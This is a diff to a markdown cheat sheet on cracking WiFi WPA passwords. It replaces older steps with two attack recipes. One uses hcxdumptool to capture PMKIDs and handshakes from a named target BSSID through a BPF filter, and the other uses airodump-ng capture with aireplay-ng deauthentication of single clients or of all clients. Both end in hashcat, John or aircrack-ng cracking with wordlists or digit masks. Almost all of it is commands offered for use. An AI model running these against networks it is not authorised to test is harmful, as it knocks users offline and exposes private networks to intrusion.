@@ -24,6 +24,7 @@ sudo ip link set dev $interface up
 
 ## Put Wireless Interface in Monitor Mode
 
+
 1. check for available interfaces
 
 `airmon-ng check`
@@ -102,45 +103,110 @@ sudo aireplay-ng -0 0 -a $AP_mac -c $victim_mac $interface
 
 `sudo aireplay-ng -0 0 -a $AP_mac  $interface`
 
-Discovery: sudo hcxdumptool --do_rcascan -i wlan0
 
-Examples of the target and how traffic is captured:
-
-1.Stop all services that are accessing the WLAN device (e.g .: NetworManager and wpa_supplicant.service)
-
-Code:
-sudo systemctl stop NetworkManager.service
-sudo systemctl stop wpa_supplicant.service
-
-2. Start the attack and wait for you to receive PMKIDs and / or EAPOL message pairs, then exit hcxdumptool
-
-create list of interesting bssids
-
-cat bssid_list_8282.txt 
-1c61b4e38221
-1c61b4e38281
-c04a00f586c1
-
-attack:
-sudo hcxdumptool -i wlan0 -o 8282_cap.pcapng --filterlist_ap=bssid_list_8282.txt --filtermode=2 --active_beacon --enable_status=15
-
-sudo hcxdumptool -i wlan0 -o sverdlova.pcapng --active_beacon --enable_status=15
-
-3. Restart stopped services to reactivate your network connection
-
-Code:
+## Attack 1
 
 
-4. Convert the traffic to hash format 22000
+The command to get general information about the target (ESSID, CHANNEL, MAC_AP. IN/OFF RANGE) is:
 
-Code:
-$ hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
+hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=1 -F
 
-5. Run Hashcat on the list of words obtained from WPA traffic
 
-Code:
-$ hashcat -m 22000 hash.hc22000 wordlist.txt
+The command to get general information about the target (ESSID, CHANNEL, MAC_AP. IN/OFF RANGE) and to check that it is within range:
 
+hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=5 -F
+
+
+The full command to create a BPF to the target (attack ccce1edc3bee) would be as follows:
+
+hcxdumptool --bpfc="wlan addr1 ccce1edc3bee or wlan addr2 ccce1edc3bee or wlan addr3 ccce1edc3bee or type mgt subtype probereq" > attack.bpf
+
+
+Since we have now made the BPF, we can start the attack using all the information mentioned above depending on the invasive levewl:
+
+sudo hcxdumptool -i wlan0 -c 11a --bpf=attack.bpf -w testap.pcapng
+
+or (do not respond to CLIENTs)
+sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --bpf=attack.bpf -w testap.pcapng
+
+or (do not DISASSOCIATE CLIENTs)
+sudo hcxdumptool -i wlan0 --rds=3 -c 11a --disable_disassociation --bpf=attack.bpf -w testap.pcapng
+
+or (do not respond to CLIENTs and do not DISASSOCIATE CLIENTs)
+sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --disable_disassociation --bpf=attack.bpf -w testap.pcapng
+
+
+Convert the traffic to hash format 22000
+
+hcxpcapngtool -o testap.hc22000 testap.pcapng
+
+Run Hashcat on the list of words obtained from WPA traffic
+
+
+```bash
 hashcat -m 22000 filtered_hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
 -a 3: Specifies a mask attack.
 ?d: Represents a digit (0–9).
+```
+
+OR use John
+
+hcxpcapngtool --john testap.john testap.pcapng
+crunch 8 12 -t @@@@@@@@ > mylist.txt
+john -w mylist.txt --format=wpapsk-opencl testap.john
+
+
+## Attack 2
+
+Old attack but is also proven.
+
+```bash
+sudo apt update && sudo apt install aircrack-ng
+
+iwconfig
+
+```
+
+Enable monitoring mode
+
+```bash
+airmon-ng check kill  
+airmon-ng start wlan0  
+iw dev
+```
+
+Find target
+
+```bash
+sudo airodump-ng --band abg $interface
+```
+
+`airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon`
+
+Deauth some client connected to the target BSSID to get the handshake faster:
+
+`aireplay-ng -0 5 -a [BSSID] -c [CLIENT MAC] wlan0mon`
+
+-0 5: 5 deauth packets
+
+Or (careful) deauth all:
+
+`aireplay-ng -0 0 -a [BSSID] wlan0mon`
+
+WAit for handshake captured message max 1-2 minutes
+
+Crack the passphrase with aircrack:
+
+`aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap`
+
+Or use hashcat for this 
+
+```bash
+hcxpcapngtool -o hash.hc22000 handshake-01.cap
+hashcat -m 22000 hash.hc22000 /path/to/wordlist -w 3
+hashcat -m 22000 -a 3 -w 3 hash.hc22000 ?d?d?d?d?d?d?d?d
+```
+
+Or make own dictionary
+
+`crunch 8 12 -t @@@@@@@@ > mylist.txt`
